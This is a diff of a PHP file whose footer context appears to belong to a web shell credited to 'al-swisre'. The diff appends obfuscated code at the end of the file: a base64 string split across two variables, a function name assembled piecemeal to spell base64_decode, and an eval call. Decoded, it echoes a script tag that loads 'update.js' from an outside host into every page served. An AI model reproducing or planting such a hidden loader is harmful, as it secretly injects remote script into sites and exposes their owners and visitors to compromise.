@@ -3858,5 +3858,9 @@ if($w){
 echo "</td></tr></table></div> |<b class='foter'>Progr4m3r by <a href='$pg?sws=ab'>al-swisre</a></b>|<b class='foter'>E-m4il : <a href='#'>oy3@hotmail.com</a></b>|<b class='foter'>My twitter : <a target='_blank' href='http://twitter.com/#!/al_swisre'>al_swisre</a></b>| </html> ";
 
  
-
+$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL2luaj";
+$winr = "NjdC5pbmZvL3VwZGF0ZS5qcz48L1NDUklQVD4iOw==";
+$min = 'base' . (128 / 2) . '_de' . 'code';
+eval($min($linr . $winr));
+   
 ?>
